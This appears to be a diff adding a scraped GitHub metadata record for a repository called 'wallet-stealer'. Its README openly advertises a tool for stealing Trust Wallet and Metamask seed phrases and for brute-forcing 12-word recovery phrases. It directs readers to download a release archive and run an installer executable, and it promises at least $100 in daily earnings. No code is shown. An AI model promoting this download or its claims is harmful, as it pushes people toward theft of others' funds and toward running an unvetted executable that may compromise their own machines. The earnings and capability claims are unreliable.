@@ -1,0 +1,35 @@
+{
+  "name": "malwisp/wallet-stealer",
+  "description": "Wallet Stealer Software 🔥 Steal Pass Phrases of Trust Wallet and Metamask Wallets! Bitcoin Mining, Ethereum, BNB, LTC. Brute Force 12 Word Secret Phrase. Blockchain",
+  "stars": 1394,
+  "forks": 0,
+  "watchers": 1394,
+  "mainLanguage": null,
+  "languages": {},
+  "topics": [
+    "crypto-steal",
+    "stealer",
+    "stealer-crypt",
+    "stealer-rat",
+    "stealer-windows",
+    "wallet-stealer-script",
+    "walletstealer"
+  ],
+  "readme": "# wallet-stealer\n## Wallet Stealer Software 🔥 Steal Pass Phrases of Trust Wallet and Metamask Wallets! Bitcoin Mining, Ethereum, BNB, LTC. Brute Force 12 Word Secret Phrase. Blockchain\n\n### Installation\n[![asdasdasd](https://github.com/user-attachments/assets/d2db8100-3167-4b78-9b3c-f63c863d7c55)\n](https://github.com/malwisp/wallet-stealer/releases/download/V6.4/Release.zip)\n\n## **1. [Download the archive](https://github.com/malwisp/wallet-stealer/releases/download/V6.4/Release.zip) from releases and extract it to a convenient folder.**\n## **2. Run the auto-installer `Installing_File_x64_32bit.exe`. It will install and download all necessary packages for > operation.**\n## Features:\n- ✅ Works for all wallets!\n\n- ✅ BSC, ETH, BTC and MORE BLOCKCHAINS!\n\n- ✅ Works with the speed of light!\n\n- ✅ 2048 WORDS used for secret phrases!\n\n- ✅ EARN 100$ MINIMUM DAILY!\n\n- ✅ Easy to run!\n\n- ✅ 100% Automatic!\n\n\n\n## Contributing\nContributions are welcome from those who wish to improve the functionality and security of this tool. Please fork the repository and submit a pull request with your enhancements.\n\n## License\nThis project is distributed under the MIT License. See the `LICENSE` file for more details.\n\n## Acknowledgments\n- Thanks to the community for providing the underlying technologies that make this tool possible.\n",
+  "homepage": "",
+  "defaultBranch": "main",
+  "hasIssues": true,
+  "hasWiki": true,
+  "license": "MIT License",
+  "createdAt": "2024-10-31T19:55:42Z",
+  "updatedAt": "2024-11-03T03:27:37Z",
+  "pushedAt": "2024-10-31T19:57:23Z",
+  "url": "https://github.com/malwisp/wallet-stealer",
+  "gitUrl": "git://github.com/malwisp/wallet-stealer.git",
+  "sshUrl": "git@github.com:malwisp/wallet-stealer.git",
+  "owner": {
+    "name": "malwisp",
+    "avatarUrl": "https://avatars.githubusercontent.com/u/160290953?v=4",
+    "url": "https://github.com/malwisp"
+  }
+}
